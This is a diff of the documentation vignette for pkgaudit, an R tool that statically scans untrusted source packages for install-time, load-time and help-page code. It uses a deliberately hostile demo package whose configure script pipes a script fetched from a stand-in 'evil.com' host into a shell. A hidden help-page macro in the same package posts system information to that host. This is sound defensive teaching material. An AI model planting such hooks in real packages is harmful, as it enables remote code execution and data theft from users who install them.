@@ -4,139 +4,20 @@ pkgaudit reports which parts of an R package can execute, when they
 execute, and what they do, so that an untrusted package can be reviewed
 before it is installed and loaded. It never executes the code it scans.
 
-A finding is not an accusation. Flagged files and code are often
-legitimate: `configure` scripts exist for system-dependent
-configuration, and many packages call system tools or download files for
-good reason. pkgaudit identifies what deserves a reader’s attention, not
-what is malicious.
+A finding is not an accusation. `configure` scripts and calls to system
+tools, for example, are often legitimate. pkgaudit helps to identify
+what deserves reviewer attention, not what is malicious.
 
 ``` r
 
 library(pkgaudit)
 ```
 
-## How a package is covered
+## Example package
 
-pkgaudit accounts for every file it can identify as code and records
-what it made of each one, in a `coverage` frame:
-
-- **parsed** – R, wherever a package carries it. Matched against R’s
-  parse tree, so a finding is located by line and column and attributed
-  to the construct that encloses it.
-- **matched** – shell scripts and Make-like files, matched as text. Less
-  precise: a match inside a comment reads the same as one in a live
-  command.
-- **exportable** – C, C++, Fortran, Rust, Python, JavaScript, and
-  vignette chunks in those languages. Not read by pkgaudit;
-  [`export_unscanned()`](https://tylerjssmith.github.io/pkgaudit/reference/export_unscanned.md)
-  writes them out for a scanner that reads them.
-- **unexamined** – present and accounted for, but not read: serialized
-  `.rda` and `.rds` objects, binaries, and files no rule claims.
-- **error** – pkgaudit tried to read the file and could not, because it
-  was too large, unreadable, or would not parse. Distinct from
-  `unexamined`, where it never tried.
-
-Coverage is never complete, and is not meant to be. What the frame
-offers is not completeness but legibility: a clean result can be checked
-rather than taken on trust, because the scan says what it did not look
-at.
-
-## Rules
-
-pkgaudit separates *when* code executes from *what* code does, using
-four categories of rule.
-
-- **File contexts** tell the scan which files to read, and how. Most
-  exist so that a file’s *contents* can be reported – `R/`, `man/`,
-  `vignettes/`, `tests/`, `data/`. A file context is a finding in its
-  own right only when it both runs automatically *and* can only be
-  matched as text: in practice the shell scripts and Make-like files,
-  where pkgaudit cannot say what the file does, only that it runs, so
-  the file itself is what needs reading.
-- **Code contexts** say when a piece of R code runs. Some are lifecycle
-  hooks matched by a rule – `.onLoad()`, `.onAttach()` and their kin.
-  The rest are computed from where the code sits: the top level of `R/`,
-  a help-file example, a `\Sexpr{}` macro at a given stage, a vignette
-  chunk, a test.
-- **Patterns** are security-relevant function calls, matched against R’s
-  parse tree. [`system()`](https://rdrr.io/r/base/system.html) executes
-  shell commands; [`source()`](https://rdrr.io/r/base/source.html) can
-  fetch and execute a remote script.
-- **Matches** are regular-expression matches in shell scripts and
-  Make-like files. `curl` and `wget`, for example, can fetch a remote
-  payload or send data to a remote host while a package is being built
-  or installed.
-
-A code context is not a finding of its own. It travels on `patterns`, as
-the column a finding’s lifecycle phases are derived from.
-
-The full rule set is documented in [Rule
-Coverage](https://tylerjssmith.github.io/pkgaudit/articles/rules.md).
-
-## Rules and database integrity
-
-The rules live in a versioned SQLite database shipped with the package.
-[`load_rules()`](https://tylerjssmith.github.io/pkgaudit/reference/load_rules.md)
-reads it;
-[`rules_version()`](https://tylerjssmith.github.io/pkgaudit/reference/rules_version.md)
-reports the version.
-
-``` r
-
-rules_version()
-#> [1] "0.4.0"
-
-rules <- load_rules()
-vapply(rules, nrow, integer(1))
-#> file_contexts code_contexts      patterns       matches        phases 
-#>            45             6            21            11            65
-```
-
-`phases` holds one row per context code can execute in: every file- and
-code-context rule, plus the computed contexts.
-
-Not every file-context rule is a finding. Rules covering `R/` and `man/`
-tell the scan which files to read; only a rule with `report = TRUE`
-contributes a row to `result$file_contexts`.
-
-``` r
-
-table(rules$file_contexts$type, rules$file_contexts$report)
-#>        
-#>         FALSE TRUE
-#>   make      0    7
-#>   other     7    0
-#>   qmd       1    0
-#>   R        14    1
-#>   Rd        3    0
-#>   Rmd       1    0
-#>   Rnw       1    0
-#>   rsp       1    0
-#>   shell     1    8
-```
-
-A modified database is one way to evade a scanner.
-[`load_rules()`](https://tylerjssmith.github.io/pkgaudit/reference/load_rules.md)
-verifies the database against its bundled SHA-256 sidecar on every call
-and refuses to load a modified one. The hash of an installed copy can
-also be checked against the value published in the
-[README](https://github.com/tylerjssmith/pkgaudit#database-integrity):
-
-``` r
-
-digest::digest(
-  system.file("db", "rules.db", package = "pkgaudit"),
-  algo = "sha256",
-  file = TRUE
-)
-#> [1] "d73ed7f7e41125d89a524e22d82ac467c0ca2a93991781c8b5015f789fcf0127"
-```
-
-## An example package
-
-`untrustedpkg` is a small source package shipped with pkgaudit that does
-three things a reviewer would want to know about. It is never built,
-checked, installed, or loaded; it exists only to be scanned.
+`untrustedpkg` is a small source package shipped with pkgaudit. It is
+never built, checked, installed, or loaded; it exists only to be
+scanned.
 
 ``` r
 
@@ -154,34 +35,30 @@ list.files(pkg, recursive = TRUE)
 #> [4] "R/fetch.R"         "R/zzz.R"
 ```
 
-A `configure` script runs during installation from source, before any R
-code is loaded. This one fetches a remote script and pipes it into a
-shell:
+A `configure` script is a shell script that R runs when a package is
+installed from source, before any of its R code is loaded:
 
     #!/bin/sh
     echo configuring
     curl -s https://www.evil.com/evil.sh | sh
 
-`.onLoad()` runs automatically when the namespace is loaded, so its body
-executes on
-[`library(untrustedpkg)`](https://rdrr.io/r/base/library.html). An
-ordinary function, by contrast, runs only if someone calls it:
+`R/zzz.R` defines `.onLoad()`, a hook R calls when the namespace is
+loaded:
 
     .onLoad <- function(libname, pkgname) {
       system("uname -a")
     }
+
+`R/fetch.R` defines an ordinary function:
+
     fetch_data <- function(url) {
       download.file(url, tempfile())
     }
 
-A help file carries R code too, in two places that run at different
-times. Its `\examples{}` block runs under `R CMD check`. Its `\Sexpr{}`
-macro runs whenever the page is rendered – during `R CMD build` and
-installation from source – and here it is written
-`\Sexpr[results=hide]{...}`, which suppresses the output. A person
-reading `?fetch_data` sees the description and the example, but nothing
-of the `httr::POST()` call: it runs on their machine, invisibly, when
-the page is built.
+A help file can carry R code in two places that run at different times.
+An `\examples{}` block runs under `R CMD check`. A `\Sexpr{}` macro runs
+whenever the page is rendered, which includes `R CMD build` and
+installation from source:
 
     \name{fetch_data}
     \alias{fetch_data}
@@ -197,9 +74,9 @@ the page is built.
     }
 
 The script that generates this package is in
-[data-raw/create_untrustedpkg.R](https://github.com/tylerjssmith/pkgaudit/blob/master/data-raw/create_untrustedpkg.R).
+[data-raw/create_untrustedpkg.R](https://github.com/tylerjssmith/pkgaudit/blob/main/data-raw/create_untrustedpkg.R).
 
-## Scanning a package directory
+## Auditing a package
 
 [`audit_package()`](https://tylerjssmith.github.io/pkgaudit/reference/audit_package.md)
 scans an unpacked source package. Printing the result gives the scan
@@ -212,9 +89,9 @@ result <- audit_package(pkg)
 print(result)
 #> --- pkgaudit ----------------------------------------------------------------
 #> Package:   untrustedpkg v0.1.0 (source directory)
-#> Path:      /tmp/RtmpSRnBP0/untrustedpkg-example/untrustedpkg
+#> Path:      /tmp/RtmpJ0IoQi/untrustedpkg-example/untrustedpkg
 #> SHA-256:   50be0a4fe9997cb47764c1eb2026be864242314a4af6dfd634e60a358dec8171
-#> Scanned:   2026-08-11 22:10 UTC with pkgaudit v0.4.0, rules v0.4.0
+#> Scanned:   2026-08-12 16:03 UTC with pkgaudit v0.4.0, rules v0.4.0
 #> 
 #> File contexts:  1
 #> Patterns:       4
@@ -225,17 +102,15 @@ print(result)
 [`summary()`](https://rdrr.io/r/base/summary.html) reports the findings
 themselves: how often each rule matched, split by the lifecycle phase
 the code runs in, with the MITRE ATT&CK techniques the rule carries.
-Phases overlap – building a package with vignettes also installs and
-loads it – so one occurrence is counted under every phase it runs in.
 
 ``` r
 
 summary(result)
 #> --- pkgaudit Summary --------------------------------------------------------
 #> Package:   untrustedpkg v0.1.0 (source directory)
-#> Path:      /tmp/RtmpSRnBP0/untrustedpkg-example/untrustedpkg
+#> Path:      /tmp/RtmpJ0IoQi/untrustedpkg-example/untrustedpkg
 #> SHA-256:   50be0a4fe9997cb47764c1eb2026be864242314a4af6dfd634e60a358dec8171
-#> Scanned:   2026-08-11 22:10 UTC with pkgaudit v0.4.0, rules v0.4.0
+#> Scanned:   2026-08-12 16:03 UTC with pkgaudit v0.4.0, rules v0.4.0
 #> 
 #> --- R Patterns --------------------------------------------------------------
 #> phase            rule            n   attck
@@ -270,8 +145,6 @@ Both methods accept `path = FALSE`, which omits the local filesystem
 path. This matters when sharing results, since the path may reveal a
 username or directory layout.
 
-## Reading the result
-
 A `pkgaudit` object is a named list of ordinary data frames, so findings
 can be filtered, joined and reported on directly.
 
@@ -282,10 +155,11 @@ names(result)
 #> [5] "errors"        "metadata"
 ```
 
-`patterns` locates each finding by file, line and column, and records
-the code context it sits in. Each frame also carries the rule’s
-`message`, its ATT&CK techniques, and one logical column per lifecycle
-phase; those are omitted below to keep the output readable.
+`patterns` holds security-relevant R calls, located by file, line and
+column, and records the code context each one sits in. Every findings
+frame also carries the rule’s `message`, its ATT&CK techniques, and one
+logical column per lifecycle phase; those are omitted below to keep the
+output readable.
 
 ``` r
 
@@ -303,14 +177,6 @@ result$patterns[, c("rule", "file_context", "line_number", "code_context",
 #> 4 httr::POST("https://www.evil.com/collect", body = list(info = Sys.info()...
 ```
 
-Two columns describe how the code is *reached* rather than what it is.
-`guarded` is `TRUE` for code that ships but the lifecycle does not run –
-a `\dontrun{}` block, or a vignette chunk marked `eval=FALSE`.
-`indirect` is `TRUE` where the call was made through the function’s name
-rather than the function, as in `do.call("system", ...)`; such a finding
-is reported under the rule that owns the name, so filtering on `rule`
-finds every call to it however it was spelled.
-
 `matches` mirrors `patterns` but carries no `code_context`: a shell
 script has no R parse tree to sit in, so a match is located by file
 alone.
@@ -322,7 +188,12 @@ result$matches[, c("rule", "file_context", "line_number", "preview")]
 #> 1 curl    configure           3 curl -s https://www.evil.com/evil.sh | sh
 ```
 
-`coverage` accounts for the files themselves.
+`coverage` accounts for the files themselves, recording what pkgaudit
+made of each one: `parsed` for R, matched against its parse tree;
+`matched` for shell and Make-like files, matched as text; `exportable`
+for languages pkgaudit does not read, such as C and Python; `unexamined`
+for files it did not read, such as serialized `.rda` and `.rds` objects;
+and `error` where it tried to read a file and could not.
 
 ``` r
 
@@ -335,13 +206,17 @@ result$coverage[, c("file_context", "language", "status", "reason", "lines")]
 #> 5 man/fetch_data.Rd       Rd     parsed    <NA>    12
 ```
 
-### Filtering by phase
+Coverage may not be complete. What the frame offers is not completeness
+but legibility: a clean result can be checked rather than trusted,
+because the scan says what it did not cover.
 
-Every findings frame carries one logical column per phase:
+### Subsetting by phase
+
+Every findings frame carries one logical column per lifecycle phase:
 `at_autoconf`, `at_build`, `at_check`, `at_install_src`,
 `at_install_bin`, `at_load`, `at_attach`, `at_unload`, `at_detach`. A
-pattern inside an ordinary function is `FALSE` for all of them – it runs
-only if something calls it.
+pattern inside an ordinary function is `FALSE` for all of them, since it
+runs only if something calls it.
 
 ``` r
 
@@ -361,7 +236,7 @@ summary(result, phase = "at_load", path = FALSE)
 #> --- pkgaudit Summary --------------------------------------------------------
 #> Package:   untrustedpkg v0.1.0 (source directory)
 #> SHA-256:   50be0a4fe9997cb47764c1eb2026be864242314a4af6dfd634e60a358dec8171
-#> Scanned:   2026-08-11 22:10 UTC with pkgaudit v0.4.0, rules v0.4.0
+#> Scanned:   2026-08-12 16:03 UTC with pkgaudit v0.4.0, rules v0.4.0
 #> Phases:    at_load
 #> 
 #> --- R Patterns --------------------------------------------------------------
@@ -378,47 +253,103 @@ summary(result, phase = "at_load", path = FALSE)
 #> No exceptions were raised.
 ```
 
-## Scanning a tarball
+Phases overlap: building a package with vignettes also installs and
+loads it, so one occurrence is counted under every phase it runs in.
 
-The more common workflow is to scan a package that has not been
-installed.
-[`audit_tarball()`](https://tylerjssmith.github.io/pkgaudit/reference/audit_tarball.md)
-validates a `.tar.gz` source package, extracts it to a temporary
-directory, scans it, and removes the directory.
+## Reviewing findings
+
+Two columns describe how code is *reached* rather than what it is, and
+both bear on how much weight a finding deserves. `guarded` is `TRUE` for
+code that ships but the lifecycle does not run, such as a `\dontrun{}`
+block or a vignette chunk marked `eval=FALSE`. `indirect` is `TRUE`
+where a call was made through the function’s name rather than the
+function, as in `do.call("system", ...)`; the finding is reported under
+the rule that owns the name, so filtering on `rule` finds every call to
+it however it was spelled.
+
+`untrustedpkg` returns five findings. Read in order of the phases they
+run in, they escalate.
+
+**[`download.file()`](https://rdrr.io/r/utils/download.file.html) in
+`R/fetch.R` runs at no phase.** It sits in the body of `fetch_data()`,
+so it executes only if a user calls that function. A package that
+downloads a file when asked to download a file is doing its job. This is
+the baseline: a capability, disclosed in an exported function.
+
+**[`download.file()`](https://rdrr.io/r/utils/download.file.html) in
+`man/fetch_data.Rd` runs under `R CMD check`.** The same call appears in
+the `\examples{}` block, so checking the package fetches the URL.
+Examples are meant to run, and a reviewer would weigh this as
+documentation that reaches the network rather than as an attack.
+
+**[`system()`](https://rdrr.io/r/base/system.html) in `R/zzz.R` runs on
+[`library()`](https://rdrr.io/r/base/library.html).** `.onLoad()` is
+called when the namespace loads, so `system("uname -a")` executes on
+attach, and again at build, check, and installation from source, each of
+which loads the package. Nobody asked for it. The command itself is
+reconnaissance rather than damage, but the capability is arbitrary shell
+execution at load time.
+
+**`curl` in `configure` runs at installation from source.** The script
+pipes a remote script directly into a shell:
+
+    #!/bin/sh
+    echo configuring
+    curl -s https://www.evil.com/evil.sh | sh
+
+This executes before any R code is loaded, and what it executes is not
+in the package: it is whatever the remote host serves at the moment of
+installation. Nothing in the source says what will run.
+
+**`httr::POST()` in `man/fetch_data.Rd` runs when the help page is
+built, and is invisible.** The call sits in a `\Sexpr[results=hide]{}`
+macro in the `\description{}` block. `\Sexpr{}` is evaluated whenever
+the page is rendered, during `R CMD build` and installation from source;
+`results=hide` suppresses its output. A reader of `?fetch_data` sees a
+one-line description and an example, and no sign that rendering the page
+sent [`Sys.info()`](https://rdrr.io/r/base/Sys.info.html) to a remote
+host.
 
 ``` r
 
-print(audit_tarball(tarball), path = FALSE)
-#> --- pkgaudit ----------------------------------------------------------------
-#> Package:   untrustedpkg v0.1.0 (source tarball)
-#> SHA-256:   0c58ddcb365787ab7401c5eedaa4be7eb4ce6bea0a5ca290b6b7b1d8eb621d44
-#> Scanned:   2026-08-11 22:10 UTC with pkgaudit v0.4.0, rules v0.4.0
-#> 
-#> File contexts:  1
-#> Patterns:       4
-#> Matches:        1
-#> Errors:         0
+result$patterns[result$patterns$code_context == "Rd_Sexpr_install",
+                c("rule", "file_context", "line_number", "preview")]
+#>   rule      file_context line_number
+#> 4 httr man/fetch_data.Rd           6
+#>                                                                       preview
+#> 4 httr::POST("https://www.evil.com/collect", body = list(info = Sys.info()...
 ```
 
-Because an untrusted archive is itself an attack surface, the tarball is
-checked before anything is extracted. The check fails closed, refusing
-the whole archive, on any link entry, path traversal, absolute or
-malformed path, or an archive that does not extract to exactly one
-top-level directory. It also enforces limits on entry count,
-uncompressed size, and compression ratio, guarding against archives that
-expand to exhaust the disk.
+This is the finding that motivates scanning documentation as code. It
+runs automatically, it exfiltrates, and it is invisible both to a user
+reading the help page and to any scanner that reads only `.R` files.
 
-``` r
+A clean scan is weak evidence of safety. pkgaudit reasons about syntax,
+so sufficiently indirect code can evade any pattern rule. A call whose
+target is a string literal is followed – `do.call("system", ...)` is
+reported as a `system` finding – but one assembled at runtime is not,
+since pkgaudit evaluates nothing. Matches are weaker still, being
+matched against text rather than a parse tree, so they both miss more
+and flag more: a `curl` inside a comment is reported, and one assembled
+from shell variables is not.
 
-str(validate_tar(tarball))
-#> 'data.frame':    7 obs. of  4 variables:
-#>  $ name    : chr  "untrustedpkg/configure" "untrustedpkg/DESCRIPTION" "untrustedpkg/man/" "untrustedpkg/man/fetch_data.Rd" ...
-#>  $ type    : chr  "file" "file" "dir" "file" ...
-#>  $ linkname: chr  "" "" "" "" ...
-#>  $ size    : int  69 150 0 381 0 65 63
-```
+A scan with findings is better understood as a reading list than a
+verdict. In review, the questions worth asking are roughly:
 
-## Carrying a scan to other tools
+- Does the package need this capability at all, given what it claims to
+  do?
+- Does it run without being asked, at install or load time, rather than
+  when a user calls a function?
+- Does it reach the network, and if so, is the destination fixed and
+  identifiable in the source?
+- Is the code being run visible in the source, or is it assembled,
+  decoded, or fetched at runtime?
+- What did the scan not read, and does any of it run automatically?
+
+Findings that answer badly on several of these at once are the ones to
+read closely.
+
+## Exporting findings
 
 [`emit_sarif()`](https://tylerjssmith.github.io/pkgaudit/reference/emit_sarif.md)
 renders a result as SARIF 2.1.0, the format code-scanning tools publish
@@ -472,29 +403,70 @@ For a package carrying compiled code, each row of the manifest maps an
 exported file back to where it came from. The directory has no default:
 naming one is how the caller consents to being written to.
 
-## Interpreting a scan
+## Auditing a tarball
 
-A clean scan is weak evidence of safety. pkgaudit reasons about syntax,
-so sufficiently indirect code can evade any pattern rule. A call whose
-target is a string literal is followed – `do.call("system", ...)` is
-reported as a `system` finding – but one assembled at runtime is not,
-since pkgaudit evaluates nothing. Matches are weaker still, being
-matched against text rather than a parse tree, so they both miss more
-and flag more: a `curl` inside a comment is reported, and one assembled
-from shell variables is not.
+The more common workflow is to scan a package that has not been
+installed.
+[`audit_tarball()`](https://tylerjssmith.github.io/pkgaudit/reference/audit_tarball.md)
+takes a `.tar.gz` source package, validates it, extracts it to a
+temporary directory, scans it, and removes the directory. An untrusted
+archive is itself an attack surface, so validation fails closed: the
+whole archive is refused rather than partially extracted.
 
-A scan with findings is better understood as a reading list than a
-verdict. In review, the questions worth asking are roughly:
+``` r
 
-- Does the package need this capability at all, given what it claims to
-  do?
-- Does it run without being asked, at install or load time, rather than
-  when a user calls a function?
-- Does it reach the network, and if so, is the destination fixed and
-  identifiable in the source?
-- Is the code being run visible in the source, or is it assembled,
-  decoded, or fetched at runtime?
-- What did the scan not read, and does any of it run automatically?
+print(audit_tarball(tarball), path = FALSE)
+#> --- pkgaudit ----------------------------------------------------------------
+#> Package:   untrustedpkg v0.1.0 (source tarball)
+#> SHA-256:   0c58ddcb365787ab7401c5eedaa4be7eb4ce6bea0a5ca290b6b7b1d8eb621d44
+#> Scanned:   2026-08-12 16:03 UTC with pkgaudit v0.4.0, rules v0.4.0
+#> 
+#> File contexts:  1
+#> Patterns:       4
+#> Matches:        1
+#> Errors:         0
+```
 
-Findings that answer badly on several of these at once are the ones to
-read closely.
+The result is a `pkgaudit` object like any other, so everything above
+applies to it unchanged.
+
+## Rule Database Integrity
+
+The rules live in a versioned SQLite database shipped with the package.
+[`load_rules()`](https://tylerjssmith.github.io/pkgaudit/reference/load_rules.md)
+reads it;
+[`rules_version()`](https://tylerjssmith.github.io/pkgaudit/reference/rules_version.md)
+reports the version.
+
+``` r
+
+rules_version()
+#> [1] "0.4.0"
+
+rules <- load_rules()
+vapply(rules, nrow, integer(1))
+#> file_contexts code_contexts      patterns       matches        phases 
+#>            45             6            21            11            65
+```
+
+A modified database is one way to evade a scanner.
+[`load_rules()`](https://tylerjssmith.github.io/pkgaudit/reference/load_rules.md)
+verifies the database against its bundled SHA-256 sidecar on every call
+and refuses to load a modified one. The hash of an installed copy can
+also be checked against the value published in the
+[README](https://github.com/tylerjssmith/pkgaudit#database-integrity):
+
+``` r
+
+digest::digest(
+  system.file("db", "rules.db", package = "pkgaudit"),
+  algo = "sha256",
+  file = TRUE
+)
+#> [1] "d73ed7f7e41125d89a524e22d82ac467c0ca2a93991781c8b5015f789fcf0127"
+```
+
+The full rule set is documented in [Rule
+Coverage](https://tylerjssmith.github.io/pkgaudit/articles/rules.md).
+How pkgaudit works internally is in
+[Internals](https://tylerjssmith.github.io/pkgaudit/articles/internals.md).
